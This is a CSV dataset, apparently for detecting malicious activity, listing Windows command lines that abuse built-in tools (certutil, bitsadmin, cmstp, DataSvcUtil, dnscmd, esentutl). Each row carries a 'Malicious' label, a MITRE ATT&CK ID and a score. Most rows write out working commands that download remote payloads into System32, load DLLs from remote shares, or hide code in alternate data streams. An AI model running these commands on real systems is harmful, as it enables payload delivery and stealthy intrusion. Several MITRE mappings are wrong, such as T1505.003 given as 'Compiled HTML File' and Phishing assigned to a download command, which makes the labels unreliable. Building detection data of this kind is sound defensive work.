Prompt,Description,LOLBin,Content,Frequency,Source,Network,Behavioural,History,MITRE ID,MITRE Technique,Score,Type
bitsadmin,Transfers files using Windows Background Intelligent Transfer Service,Yes,Files,Rare,Script,Yes,Tool Transfer,Used in malware campaigns,T1105,Ingress Tool Transfer,1,Malicious
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe,Downloads files from a remote URL and stores locally,Yes,Web,Rare,User Input,Yes,Tool Transfer,Used in red team operations,T1105,Ingress Tool Transfer,0.9,Malicious
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/... > file.doc:payload.bat,Writes a malicious payload to an alternate data stream,Yes,Files,Rare,Script,Yes,Code Injection,Observed in malware chains,T1117,Regsvr32,1,Malicious
cscript c:\ads\file.txt:script.vbs,Executes script stored in alternate data stream,Yes,Scripts,Rare,Script,No,ADS Execution,Known malware evasion technique,T1564.004,Hidden Files and ADS,0.9,Malicious
cmstp.exe /ni /s https://raw.githubusercontent.com/.../Cmstp.inf,Abuses cmstp to execute remote script via INF file,Yes,Scripts,Rare,Remote,Yes,LOLBin Exploitation,Used in Cobalt Strike,T1218.003,CMSTP,1,Malicious
bash.exe -c calc.exe,Abuses WSL (bash) to launch Windows process,No,System,Rare,Script,No,Cross-platform Execution,Seen in Red Canary tests,T1059.004,Unix Shell,0.85,Malicious
ATBroker.exe /start malware,Launches custom executable using ATBroker accessibility tool,Yes,Executable,Rare,System,No,Bypass UAC,Used in privilege escalation chains,T1546.008,Accessibility Features,0.8,Malicious
bitsadmin /create 1 & bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe ...,Creates a download job to fetch sysinternals tool from the internet,Yes,Files,Rare,Script,Yes,Remote File Transfer,Seen in attacker toolkits,T1105,Ingress Tool Transfer,1,Malicious
certreq -post -config https://example.org/ ...,Forces certificate request from remote endpoint,Yes,Registry,Rare,Script,Yes,Network Exploitation,Exploited in phishing kits,T1140,Deobfuscate/Decode Files,1,Malicious
DataSvcUtil /out:C:\Windows\System32\calc.exe /uri:https://11.11.11.11/encoded,Creates file in system directory from URL,Yes,Files,Rare,Remote,Yes,Remote File Dropper,Seen in malware drop campaigns,T1055.001,Dynamic-link Library Injection,1,Malicious
dnscmd.exe 10.10.10.10 /config /serverlevelplugindll \193.168.0.149\dll\wtf.dll,Abuses DNS server to load remote DLL from attacker machine,Yes,Network,Rare,Remote,Yes,Lateral Movement,Seen in internal pivoting,T1574.002,DLL Side-Loading,1,Malicious
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt,Posts certificate request to remote server using local system file,Yes,Files,Rare,Script,Yes,Certificate Abuse,Seen in exploit kits,T1140,Deobfuscate/Decode Files,1,Malicious
ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://10.10.10.10/xxxxxxxxx?encodedfile,Transfers remote payload into system directory via ConfigSecurityPolicy,Yes,Files,Rare,Remote,Yes,Payload Delivery,Observed in lateral movement,T1105,Ingress Tool Transfer,1,Malicious
ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://11.11.11.11/xxxxxxxxx?encodedfile,Writes executable to system directory from external URL,Yes,Files,Rare,Remote,Yes,Remote Execution,Related to dropper activity,T1055,Process Injection,1,Malicious
ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://webhook.site/xxxxxxxxx?encodedfile,Writes suspicious file via URL to sensitive path,Yes,Files,Rare,Remote,Yes,Payload Deployment,Used in red team simulations,T1566,Phishing,1,Malicious
control.exe c:\windows\tasks\file.txt:evil.dll,Uses control panel to execute DLL from alternate data stream,Yes,Files,Rare,Local,No,ADS Execution,Exploited by ransomware,T1564.004,Hidden Files and ADS,0.8,Malicious
csc.exe -out:My.exe File.cs,Compiles source code into executable (can be abused),Yes,Executable,Common,User Input,No,Code Generation,Used by malware loaders,T1505.003,Compiled HTML File,0.6,Malicious
DataSvcUtil /out:C:\Windows\System32\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile,Writes executable to system32 from external resource,Yes,Files,Rare,Remote,Yes,System File Injection,Seen in APT toolchains,T1055.001,DLL Injection,1,Malicious
diskshadow.exe /s c:\test\diskshadow.txt,Automates backup operations that could hide malware,Yes,Files,Rare,Script,No,Shadow Copy Abuse,Abused in ransomware,T1003.003,NTDS,0.9,Malicious
dllhost.exe /Processid:{CLSID},"Launches DLL using CLSID, potentially sideloading",Yes,DLL,Rare,System,No,DLL Sideloading,Exploited by malware families,T1574.002,DLL Side-Loading,0.8,Malicious
dnscmd.exe dc1.lab.int /config /serverlevelplugindll \192.168.0.149\dll\wtf.dll,Modifies DNS server to load DLL from remote share,Yes,Network,Rare,Remote,Yes,Remote DLL Load,Seen in domain persistence,T1574.002,DLL Side-Loading,1,Malicious
esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o,Copies VBScript file using ESENT API tool,Yes,Files,Rare,Local,No,File Obfuscation,Occasionally used by malware,T1027,Obfuscated Files or Information,0.8,Malicious
esentutl.exe /y C:\ADS\file.exe /d c:\ADS\file.txt:file.exe /o,Writes file into alternate data stream using ESENT,Yes,Files,Rare,Local,No,ADS Injection,Observed in stealth malware,T1564.004,Hidden Files and ADS,0.8,Malicious
